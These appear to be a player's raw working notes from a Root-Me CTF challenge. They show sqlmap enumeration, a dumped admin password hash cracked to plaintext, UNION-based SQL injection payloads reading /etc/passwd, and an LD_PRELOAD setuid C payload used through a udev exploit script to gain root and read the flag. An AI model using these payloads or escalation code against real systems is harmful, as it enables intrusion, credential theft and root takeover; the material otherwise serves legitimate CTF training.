@@ -1,0 +1,83 @@
+available databases [5]:
+[*] cms
+[*] information_schema
+[*] mysql
+[*] roundcube
+[*] test
+
+
+
+./sqlmap.py -u http://ctf03.root-me.org/index.php?id=4 -v 2 -D cms -T user --columns
+
+Database: cms
+Table: user
+[3 columns]
++---------------+-------------+
+| Column        | Type        |
++---------------+-------------+
+| user_id       | int(11)     |
+| user_password | varchar(32) |
+| user_username | varchar(50) |
++---------------+-------------+
+
+
+christrc@ubuntu:~/Desktop/SpiderOak Hive/courses-challenges/challenges/challenges root-me/ctf/lamp6$ ./sqlmap.py -u http://ctf03.root-me.org/index.php?id=4 -v 2 -D cms -T user --dump
+
+
+
+Database: cms
+Table: user
+[1 entry]
++---------+---------------+----------------------------------+
+| user_id | user_username | user_password                    |
++---------+---------------+----------------------------------+
+| 1       | admin         | 25e4ee4e9229397b6b17776bfceaf8e7 |
++---------+---------------+----------------------------------+
+25e4ee4e9229397b6b17776bfceaf8e7  md5   adminpass
+
+
+
+
+id=12 order by 7  --> 7 colones
+
+id=12 UNION SELECT null,null,null,null,null,null,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = database()
+
+id=12 UNION SELECT null,null,null,null,null,null,LOAD_FILE('/etc/passwd') FROM information_schema.TABLES WHERE TABLE_SCHEMA = database()
+
+/etc/passwd :
+
+Posted by: root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin rpm:x:37:37::/var/lib/rpm:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin avahi:x:70:70:Avahi daemon:/:/sbin/nologin mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin distcache:x:94:94:Distcache:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin nscd:x:28:28:NSCD Daemon:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin squid:x:23:23::/var/spool/squid:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash pcap:x:77:77::/var/arpwatch:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin dovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologin john:x:500:500::/home/john:/bin/bash linda:x:501:501::/home/linda:/bin/bash fred:x:502:502::/home/fred:/bin/bash molly:x:503:503::/home/molly:/bin/bash toby:x:504:504::/home/toby:/bin/bash
+
+
+mettre backdoor dans /files
+
+suid.c
+void _init()
+{
+ setgid(0);
+ setuid(0);
+ unsetenv("LD_PRELOAD");
+ execl("/bin/sh","sh","-c","chown apache:apache /passwd; chmod 777 /passwd",NULL);
+}
+
+
+/tmp>./udev.sh 403
+suid.c: In function 'main':
+suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
+cp: `libno_ex.so.1.0' and `/tmp/libno_ex.so.1.0' are the same file
+/tmp>ls -l
+total 44
+-rwxr-xr-x 1 apache apache 2408 Feb 14 10:13 libno_ex.so.1.0
+-rwxr-xr-x 1 apache apache 5013 Feb 14 10:13 suid
+-rw-r--r-- 1 apache apache  124 Feb 14 10:13 suid.c
+drwxr-xr-x 3 apache apache 4096 Feb 14 10:02 tmp
+-rwxr-xr-x 1 apache apache 6209 Feb 14 10:13 udev
+-rw-r--r-- 1 apache apache 2216 Feb 14 10:13 udev.c
+-rwxr-xr-x 1 apache apache 3484 Feb 14 10:12 udev.sh
+/tmp>rm *
+rm: cannot remove `tmp': Is a directory
+/tmp>ls -l /passwd
+-rwxrwxrwx 1 apache apache 33 Feb 14 10:00 /passwd
+/tmp>cat /passwd
+8c8ef17bc036a2477c72d8b65a78031c
+/tmp>
